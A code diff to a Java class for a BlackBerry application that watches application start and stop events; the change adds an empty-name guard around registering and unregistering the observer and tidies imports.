@@ -8,9 +8,6 @@
  * *************************************************/
 package blackberry.event;
 
-import java.io.EOFException;
-
-import net.rim.device.api.util.DataBuffer;
 import blackberry.AppListener;
 import blackberry.Messages;
 import blackberry.action.Action;
@@ -19,8 +16,7 @@ import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.ApplicationObserver;
-import blackberry.debug.Check;
-import blackberry.utils.WChar;
+import blackberry.utils.StringUtils;
 
 /**
  * The Class ProcessEvent.
@@ -41,7 +37,7 @@ public final class EventProcess extends Event implements ApplicationObserver {
         try {
             window = conf.getBoolean(Messages.getString("v.0")); //$NON-NLS-1$
             focus = conf.getBoolean(Messages.getString("v.1")); //$NON-NLS-1$
-            starname = conf.getString(Messages.getString("v.2")); //$NON-NLS-1$
+            starname = conf.getString(Messages.getString("v.2"), ""); //$NON-NLS-1$
         } catch (final ConfigurationException e) {
             //#ifdef DEBUG
             debug.trace(" Error: params FAILED");//$NON-NLS-1$
@@ -61,7 +57,14 @@ public final class EventProcess extends Event implements ApplicationObserver {
         //#ifdef DEBUG
         debug.trace("actualStart"); //$NON-NLS-1$
         //#endif
-        AppListener.getInstance().addApplicationObserver(this);
+
+        if (!StringUtils.empty(starname)) {
+            AppListener.getInstance().addApplicationObserver(this);
+        }else{
+            //#ifdef DEBUG
+            debug.warn("actualStart, empty process name, don't start");
+            //#endif
+        }
     }
 
     /*
@@ -82,8 +85,10 @@ public final class EventProcess extends Event implements ApplicationObserver {
         //#ifdef DEBUG
         debug.trace("actualStop"); //$NON-NLS-1$
         //#endif
-        AppListener.getInstance().removeApplicationObserver(this);
-        onExit();
+        if (!StringUtils.empty(starname)) {
+            AppListener.getInstance().removeApplicationObserver(this);
+            onExit();
+        }
     }
 
     public void onApplicationChange(String startedName, String stoppedName,
